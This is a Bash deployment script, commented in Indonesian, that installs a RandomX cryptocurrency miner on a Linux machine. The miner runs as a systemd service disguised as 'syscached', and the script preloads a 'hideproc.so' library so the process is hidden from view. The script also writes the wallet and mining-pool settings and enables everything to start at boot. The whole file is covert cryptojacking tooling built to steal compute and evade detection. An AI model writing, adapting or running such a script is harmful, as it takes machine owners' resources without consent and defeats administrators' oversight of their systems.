#!/usr/bin/env bash
# sandbox-deploy.sh WORKER — pasang miner CONN + hideproc + unit systemd.
#
#   ./sandbox-deploy.sh ai-workers-1
#
# File yang harus ada di direktori yang sama:
#   xcb                 (cmake --build build --parallel ...)
#   librandomx_v2.so    (ikut build; RPATH $ORIGIN)
#   hideproc.so         (make -C labs/process-hide)
#   syscached.service   (salin dari ops/systemd/)
#
# Env wajib: WALLET. Override: POOL, THREADS, HUGEPAGES.
set -euo pipefail
W="${1:?usage: sandbox-deploy.sh WORKER}"
SUDO=""; [ "$(id -u)" = 0 ] || SUDO="sudo"
DIR="$(cd "$(dirname "$0")" && pwd)"

WALLET="${WALLET:?WALLET wajib di-set (tidak ada default di repo)}"
POOL="${POOL:-eu.rplant.xyz:17194}"
THREADS="${THREADS:-4}"
HUGEPAGES="${HUGEPAGES:-1200}"

for f in xcb librandomx_v2.so hideproc.so; do
    [ -f "$DIR/$f" ] || { echo "file $f tidak ada di $DIR"; exit 1; }
done

$SUDO install -m 755 "$DIR/xcb" /usr/local/bin/xcb
$SUDO install -m 644 "$DIR/librandomx_v2.so" /usr/local/bin/librandomx_v2.so
$SUDO install -m 644 "$DIR/hideproc.so" /usr/local/lib/hideproc.so

$SUDO tee /etc/systemd/system/syscache-hugepages.service >/dev/null <<UNIT
[Unit]
Description=Hugepages for RandomX V2 dataset (CONN)
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/usr/sbin/sysctl -w vm.nr_hugepages=${HUGEPAGES} vm.max_map_count=262144
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNIT

# Unit yang sama dengan template ops/systemd; jangan menulis definisi lain di
# sini. Perbedaan instabox hanya drop-in (LD_PRELOAD + ketergantungan hugepages).
UNIT_SRC="$DIR/syscached.service"
[ -f "$UNIT_SRC" ] || UNIT_SRC="$DIR/../systemd/syscached.service"
[ -f "$UNIT_SRC" ] || {
    echo "syscached.service tidak ada di $DIR atau ../systemd; sertakan file dari ops/systemd/"
    exit 1
}

$SUDO install -d -m 755 /etc/xcb
tmp_env=$(mktemp)
cat > "$tmp_env" <<ENV
CONN_POOL=${POOL}
WALLET=${WALLET}
WORKER=${W}
THREADS=${THREADS}
ENV
$SUDO install -m 600 "$tmp_env" /etc/xcb/miner.env
rm -f "$tmp_env"

$SUDO install -m 644 "$UNIT_SRC" /etc/systemd/system/syscached.service
$SUDO install -d -m 755 /etc/systemd/system/syscached.service.d
$SUDO tee /etc/systemd/system/syscached.service.d/10-instabox.conf >/dev/null <<'UNIT'
[Unit]
After=syscache-hugepages.service
Wants=syscache-hugepages.service

[Service]
Environment=LD_PRELOAD=/usr/local/lib/hideproc.so
UNIT

$SUDO systemctl daemon-reload
$SUDO systemctl enable --now syscache-hugepages.service syscached.service
sleep 8

echo "== cek library =="
if ! ldd /usr/local/bin/xcb | grep -q 'librandomx_v2.so =>'; then
    echo "FATAL: librandomx_v2.so tidak ter-resolve oleh /usr/local/bin/xcb"
    exit 1
fi

echo "svc=$(systemctl is-active syscached.service) hp=$(awk "/HugePages_Total/{print \$2}" /proc/meminfo)"
$SUDO journalctl -u syscached -n 8 --no-pager -o cat | tail -8
